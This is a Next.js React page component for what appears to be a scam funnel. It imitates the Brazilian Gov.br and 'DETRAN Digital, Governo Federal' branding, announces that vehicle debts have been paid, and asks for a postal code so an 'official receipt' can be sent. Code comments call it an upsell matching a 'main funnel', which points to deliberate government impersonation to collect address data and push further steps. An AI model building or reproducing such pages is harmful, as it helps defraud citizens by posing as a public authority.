"use client"

import type React from "react"
import { useState } from "react"
import { useRouter } from "next/navigation"
import { consultarCEP } from "@/app/actions"

export default function UpsellPage() {
  const router = useRouter()
  const [cep, setCep] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")

  const formatCEP = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 5) {
      return numbers
    }
    return `${numbers.slice(0, 5)}-${numbers.slice(5, 8)}`
  }

  const handleCEPChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCEP(e.target.value)
    setCep(formatted)
    setError("")
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")
    setIsLoading(true)

    try {
      const result = await consultarCEP(cep)

      if (result.success && result.data) {
        sessionStorage.setItem("upsell_address", JSON.stringify(result.data))
        router.push("/upsell/endereco")
      } else {
        setError(result.error || "CEP não encontrado. Verifique e tente novamente.")
      }
    } catch (err) {
      setError("Erro ao consultar CEP. Tente novamente.")
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#F8F9FA]">
      {/* Gov.br header matching main funnel */}
      <header className="bg-[#071D41] py-4 px-4 border-b-4 border-[#FFCD07]">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <img
              src="/images/design-mode/image.png"
              alt="Gov.br"
              className="h-10 w-auto"
            />
            <div className="border-l-2 border-[#FFCD07] pl-3">
              <h1 className="text-white font-bold text-lg">DETRAN Digital</h1>
              <p className="text-[#FFCD07] text-xs">Governo Federal</p>
            </div>
          </div>
        </div>
      </header>

      {/* Success Banner */}
      <div className="bg-gradient-to-r from-[#4CAF50] to-[#45a049] text-white py-6 px-4">
        <div className="max-w-4xl mx-auto text-center">
          <div className="flex justify-center mb-3">
            <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center">
              <svg className="w-10 h-10 text-[#4CAF50]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
          </div>
          <h2 className="text-2xl md:text-3xl font-bold mb-2">Débitos Quitados com Sucesso!</h2>
          <p className="text-lg opacity-95">Seu veículo está regularizado</p>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-2xl mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-lg overflow-hidden border border-gray-200">
          <div className="bg-[#1351B4] text-white p-6 text-center">
            <h3 className="text-xl md:text-2xl font-bold mb-2">Comprovante de Quitação</h3>
            <p className="opacity-90">Informe seu CEP para envio do documento oficial</p>
          </div>

          <div className="p-6">
            <div className="bg-blue-50 border-l-4 border-[#1351B4] p-4 rounded mb-6">
              <p className="text-sm text-[#071D41]">
                O comprovante oficial será enviado para o endereço cadastrado. Este documento comprova a regularização
                do seu veículo.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label htmlFor="cep" className="block text-sm font-bold text-[#071D41] mb-2">
                  CEP para Envio *
                </label>
                <input
                  type="text"
                  id="cep"
                  value={cep}
                  onChange={handleCEPChange}
                  placeholder="00000-000"
                  maxLength={9}
                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-[#1351B4] focus:outline-none text-lg"
                  required
                />
                {error && <p className="mt-2 text-sm text-red-600">{error}</p>}
              </div>

              <button
                type="submit"
                disabled={isLoading || cep.replace(/\D/g, "").length !== 8}
                className="w-full bg-[#1351B4] text-white py-3 rounded-lg font-bold text-lg hover:bg-[#0c3c7a] transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? "Consultando..." : "Continuar"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  )
}
